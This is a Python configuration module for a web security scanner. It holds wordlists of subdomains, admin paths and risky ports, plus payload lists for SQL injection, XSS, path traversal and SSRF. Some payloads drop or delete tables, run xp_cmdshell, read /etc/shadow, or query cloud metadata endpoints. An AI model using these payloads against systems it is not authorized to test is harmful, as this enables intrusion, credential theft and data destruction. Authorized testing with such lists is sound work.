from colorama import Fore, Style, Back

VERSION = "1.0"
AUTHOR = "Dev Somani"
BANNER = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ███████╗ █████╗ ████████╗    ██╗   ██╗██████╗   ║
║    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ██║   ██║██╔══██╗  ║
║    ███████║███████╗███████║   ██║       ██║   █�█████╔╝  ║
║    ██╔══██║╚════██║██╔══██║   ██║       ██║   ██║██╔══██╗  ║
║    ██║  ██║███████║██║  ██║   ██║       ╚██████╔██████╔╝  ║
║    ╚═╝  ╚══════╚═╝  ╚═╝   ╚═╝        ╚═════╝╚═════╝   ║
║                                                              ║
║           Advanced Security Assessment Tool v{VERSION}                ║
║                    Happy Hacking by {AUTHOR}                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
[!] DISCLAIMER: This tool is for authorized security testing only!
[!] Unauthorized use against systems you don't own is illegal!
[!] By using this tool, you agree to use it responsibly and ethically.
{Style.RESET_ALL}
"""

# Color definitions
INFO = Fore.BLUE + "[*]" + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[+]" + Style.RESET_ALL
WARNING = Fore.YELLOW + "[!]" + Style.RESET_ALL
CRITICAL = Fore.RED + "[!!]" + Style.RESET_ALL
PROGRESS = Fore.CYAN + "[>]" + Style.RESET_ALL

# Common subdomains wordlist
SUBDOMAINS_WORDLIST = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
    'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
    'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
    'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
    'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
    'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
    'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'pro', 'mail1', 'en', 'id',
    'us', 'ns4', 'www3', 'home', 'apps', 'info', 'tech', 'database', 'stage',
    'monitor', 'storage', 'backup', 'remote', 'server', 'ssh', 'gateway', 'firewall',
    'proxy', 'upload', 'download', 'files', 'assets', 'resources', 'css', 'js',
    'img2', 'images2', 'static2', 'newsletter', 'register', 'login', 'signup',
    'account', 'accounts', 'user', 'users', 'member', 'members', 'profile',
    'profiles', 'dashboard', 'control', 'panel', 'admin2', 'administrator',
    'root', 'super', 'sysadmin', 'manager', 'management', 'operations', 'ops'
]

# Dangerous ports and their services
DANGEROUS_PORTS = {
    21: 'FTP - Anonymous access possible',
    23: 'Telnet - Unencrypted protocol',
    25: 'SMTP - Open relay possible',
    445: 'SMB - Potential for SMB vulnerabilities',
    3389: 'RDP - Remote Desktop Protocol',
    1433: 'MSSQL - Database server',
    3306: 'MySQL - Database server',
    5432: 'PostgreSQL - Database server',
    27017: 'MongoDB - Database server',
    6379: 'Redis - Database server',
    11211: 'Memcached - Cache server',
    9200: 'Elasticsearch - Database server',
    5900: 'VNC - Remote access',
    5800: 'VNC - Remote access (HTTP)',
    161: 'SNMP - Community strings',
    389: 'LDAP - Directory service',
    636: 'LDAPS - Secure LDAP',
    873: 'Rsync - File sync service',
    512: 'Rexec - Remote execution',
    513: 'Rlogin - Remote login',
    514: 'RSH - Remote shell',
    2049: 'NFS - Network File System',
    111: 'RPC - Portmapper',
    135: 'MSRPC - Windows RPC',
    139: 'NetBIOS - File sharing',
    1521: 'Oracle - Database server',
    2483: 'Oracle - Database server',
    2484: 'Oracle - Database server',
    2082: 'cPanel - Control panel',
    2083: 'cPanel SSL - Control panel',
    2086: 'WHM - Control panel',
    2087: 'WHM SSL - Control panel',
    8888: 'Webmin - Control panel',
    10000: 'Webmin - Control panel',
    8443: 'Plesk - Control panel',
    9443: 'Plesk - Control panel'
}

# Common admin panels for detection
ADMIN_PANELS = [
    '/admin', '/administrator', '/admincp', '/adminarea', '/adm', '/adminpanel',
    '/manage', '/manager', '/management', '/dashboard', '/controlpanel', '/cp',
    '/cpanel', '/webadmin', '/sysadmin', '/system', '/backend', '/secure',
    '/wp-admin', '/wp-login.php', '/joomla/administrator', '/drupal/admin',
    '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin', '/mysqladmin',
    '/tomcat-manager', '/manager/html', '/admin/login', '/user/login',
    '/admin/login.php', '/login/admin', '/admin/index.php', '/admin/home',
    '/admin/dashboard', '/admin/panel', '/moderator', '/mod', '/staff'
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' GROUP BY 1--",
    "1' GROUP BY 2--",
    "1' GROUP BY 3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; EXEC xp_cmdshell('whoami')--"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "\" onmouseover=\"alert('XSS')\"",
    "';alert('XSS');//"
]

# Path traversal payloads
PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/group",
    "../../../../etc/issue",
    "../../../../etc/motd",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/httpd/access.log",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd"
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://localhost:80",
    "http://localhost:443",
    "http://[::1]:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/metadata/instance?api-version=2017-08-01",  # Azure
    "http://metadata.google.internal/",  # GCP
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1"
]

